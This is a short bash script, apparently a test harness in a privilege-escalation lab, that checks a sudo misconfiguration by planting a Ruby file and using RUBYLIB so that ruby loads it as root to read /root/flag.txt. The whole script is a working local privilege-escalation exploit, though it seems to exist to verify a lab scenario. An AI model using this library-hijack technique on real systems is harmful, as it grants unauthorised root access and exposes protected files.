#!/usr/bin/env bash
set -euo pipefail
source "$(cd "$(dirname "$0")" && pwd)/_common.sh"
out="$(ssh_run '
cat > /home/lowpriv/rubyhijack/evil.rb <<'\''EOF'\''
if Process.uid == 0
  puts File.read("/root/flag.txt")
end
EOF
sudo -n RUBYLIB=/home/lowpriv/rubyhijack /usr/bin/ruby -r evil -e ""
')"
assert_root_output "${out}"
